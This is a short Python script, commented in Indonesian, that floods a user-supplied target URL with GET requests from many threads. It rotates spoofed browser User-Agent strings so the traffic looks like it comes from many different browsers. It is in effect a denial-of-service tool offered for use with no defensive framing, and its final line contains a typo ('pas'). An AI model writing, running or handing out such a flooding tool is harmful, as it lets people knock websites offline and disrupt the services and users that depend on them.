import threading
import random
import requests

# Dapatkan URL, jumlah permintaan, dan jumlah thread dari pengguna
url = input("Masukkan URL target: ")
num_requests = int(input("Masukkan jumlah permintaan yang akan dikirim per thread: "))
num_threads = int(input("Masukkan jumlah thread: "))

# Daftar User-Agents untuk meniru browser yang berbeda
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 Edge/113.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
]

# Fungsi untuk mengirimkan permintaan
def send_requests():
    for _ in range(num_requests):
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        try:
            response = requests.get(url, headers=headers)
            print(f"Request sent, response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Membuat dan mengaktifkan thread
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_requests)
    thread.daemon = True
    threads.append(thread)

for thread in threads:
    thread.start()

# Tahan thread utama hingga semua thread selesai
while any(thread.is_alive() for thread in threads):
    pas
